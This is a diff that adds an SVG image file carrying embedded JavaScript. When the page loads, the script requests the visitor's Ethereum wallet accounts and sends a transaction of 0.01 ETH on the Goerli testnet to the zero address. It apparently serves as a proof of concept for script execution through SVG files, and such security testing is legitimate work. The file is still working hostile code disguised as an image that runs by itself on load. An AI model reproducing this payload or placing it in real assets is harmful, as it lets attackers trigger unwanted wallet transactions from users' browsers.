@@ -1,0 +1,44 @@
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+  <script type="application/ecmascript">
+    <![CDATA[
+      "use strict";
+
+      console.log("JS running: " + document.location.origin);
+
+      async function requestAccountsAndSendTransaction() {
+        if (window.ethereum) {
+          try {
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            console.log(accounts);
+
+            const transactionParameters = {
+              nonce: "0x00",
+              gasPrice: "0x244AC6D",
+              gas: "0x12A52",
+              to: "0x0000000000000000000000000000000000000000",
+              from: ethereum.selectedAddress,
+              value: "0x2386F26FC10000",
+              data: "0x00",
+              chainId: "0x5",
+            };
+
+            const txHash = await ethereum.request({
+              method: "eth_sendTransaction",
+              params: [transactionParameters],
+            });
+
+            console.log("Transaction sent. Transaction hash:", txHash);
+          } catch (err) {
+            console.log("Error executing transaction:", err.message);
+          }
+        }
+      }
+
+      window.addEventListener('load', async () => {
+        console.log("Ethereum object available.");
+        console.log(window.ethereum);
+        await requestAccountsAndSendTransaction();
+      });
+    ]]>
+  </script>
+</svg>
